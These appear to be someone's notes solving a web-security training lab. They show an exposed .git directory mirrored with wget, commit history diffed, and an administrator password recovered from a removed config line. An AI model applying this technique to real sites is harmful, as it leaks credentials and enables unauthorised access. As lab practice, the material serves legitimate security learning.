/*

access this 
https://0a8e0051043ac72581a9cab400080003.web-security-academy.net/.git

theres only one branch - master

[user]
	email = carlos@evil-user.net
	name = Carlos Montoya

COMMIT_EDITMSG reveals
Remove admin password from config


.git/logs/refs/heads/master      reveals
893aab2da9d4cbffd944e85a0340e6e5486a2b9f 
3de93055433d42b0dc15c8877b6068f7647567d9 
by Carlos Montoya <carlos@evil-user.net> 
commit: Remove admin password from config

wget -r https://0a8e0051043ac72581a9cab400080003.web-security-academy.net/.git

git diff 3de93055433d42b0dc15c8877b6068f7647567d9 893aab2da9d4cbffd944e85a0340e6e5486a2b9f

-ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+ADMIN_PASSWORD=0ji88qrpv3a2xch5dot1

username: administrator
password: 0ji88qrpv3a2xch5dot1
*/